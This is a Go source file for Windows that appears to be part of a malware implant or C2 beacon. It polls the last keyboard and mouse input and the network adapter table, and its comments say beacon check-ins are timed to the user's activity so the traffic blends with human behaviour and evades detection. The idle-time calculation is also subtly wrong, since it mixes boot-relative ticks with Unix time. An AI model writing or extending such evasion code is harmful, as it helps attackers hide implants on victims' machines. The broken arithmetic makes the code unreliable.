//go:build windows

package main

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows trigger detection: last input via user32 + adapter table diff.
var lastUserActivity time.Time
var lastNetworkState string

func detectUserActivity() bool {
	mod := windows.NewLazySystemDLL("user32.dll")
	proc := mod.NewProc("GetLastInputInfo")
	type lastInputInfo struct {
		cbSize uint32
		dwTime uint32
	}
	var lii lastInputInfo
	lii.cbSize = uint32(unsafe.Sizeof(lii))
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&lii)))
	if ret == 0 {
		return false
	}
	now := uint32(time.Now().Unix())
	idle := now - lii.dwTime/1000
	lastUserActivity = time.Now()
	return idle < 30 // User active in last 30 seconds
}

// userIdleSeconds returns how long (in seconds) since the last real user input
// (keyboard/mouse). Used to shape beacon cadence: check in faster while the
// operator is actively using the host, slower when it has been idle — so the
// beacon blends with normal human behaviour instead of ticking on a fixed clock.
func userIdleSeconds() int {
	mod := windows.NewLazySystemDLL("user32.dll")
	proc := mod.NewProc("GetLastInputInfo")
	type lastInputInfo struct {
		cbSize uint32
		dwTime uint32
	}
	var lii lastInputInfo
	lii.cbSize = uint32(unsafe.Sizeof(lii))
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&lii)))
	if ret == 0 {
		return 9999
	}
	now := uint32(time.Now().Unix())
	idle := now - lii.dwTime/1000
	if int(idle) < 0 {
		return 0
	}
	return int(idle)
}

func detectNetworkChange() bool {
	mod := windows.NewLazySystemDLL("iphlpapi.dll")
	proc := mod.NewProc("GetAdaptersInfo")
	buf := make([]byte, 4096)
	bufLen := uint32(len(buf))
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&bufLen)))
	if ret != 0 {
		return false
	}
	current := string(buf[:bufLen])
	if lastNetworkState == "" {
		lastNetworkState = current
		return false
	}
	if current != lastNetworkState {
		lastNetworkState = current
		return true
	}
	return false
}